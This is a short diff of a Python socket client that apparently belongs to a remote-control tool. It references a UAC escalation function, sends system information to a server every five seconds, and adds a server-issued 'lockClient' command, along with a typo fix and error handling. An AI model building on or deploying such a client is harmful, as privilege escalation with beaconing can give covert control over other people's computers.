@@ -106,7 +106,7 @@ def data_receive(sock, end='[ENDOFMESSAGE]'):
                 continue
         return ast.literal_eval(received_data)
     except socket.error:
-        return {'payload': '', 'mode': '', 'frome': '', 'to': ''}
+        return {'payload': '', 'mode': '', 'from': '', 'to': ''}
 
 
 # Send Data Function
@@ -139,10 +139,13 @@ def uac_escalation(argv=None, debug=False):
 
 def send_info(sock):
     global ACTIVE
-    while ACTIVE:
-        data_send(sock, check_info(), 'infoChecker')
-        time.sleep(5)
 
+    while ACTIVE:
+        try:
+            data_send(sock, check_info(), 'infoChecker')
+            time.sleep(5)
+        except socket.error:
+            ACTIVE = False
 
 def reactor():
     global ACTIVE
@@ -199,6 +202,10 @@ def reactor():
 
                                     try:
                                         data = data_receive(server_socket)
+
+                                        if data['payload'] == 'lockClient':
+                                            UNLOCKED = False
+
                                     except socket.error:
                                         break
 
